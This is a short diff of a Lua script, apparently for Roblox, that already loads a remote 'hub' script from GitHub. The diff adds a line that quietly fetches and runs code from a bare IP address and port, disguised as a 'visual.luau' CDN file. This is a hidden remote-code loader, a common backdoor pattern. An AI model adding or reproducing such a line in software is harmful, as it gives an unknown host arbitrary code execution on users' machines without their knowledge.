@@ -90,6 +90,7 @@ local TweenService = game:GetService("TweenService")
 
 spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/brefyg/XHub/refs/heads/main/HubScript.txt"))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end)
 
 spawn(function()
